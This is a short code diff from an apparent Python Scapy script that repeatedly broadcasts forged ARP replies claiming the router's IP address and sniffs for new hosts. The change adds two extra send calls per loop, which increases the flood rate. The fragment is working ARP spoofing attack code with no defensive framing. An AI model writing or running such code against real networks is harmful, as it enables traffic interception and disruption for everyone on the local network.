@@ -27,6 +27,8 @@ payload = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2,psrc=router_ip,pdst=broad_ip)
 
 while True:
 	sendp(payload,verbose=False)
+	sendp(payload,verbose=False)
+	sendp(payload,verbose=False)
 	#sendp(payload)
 	sniff(prn=find_new_ip, count =1)
 	if cnt >= 1:
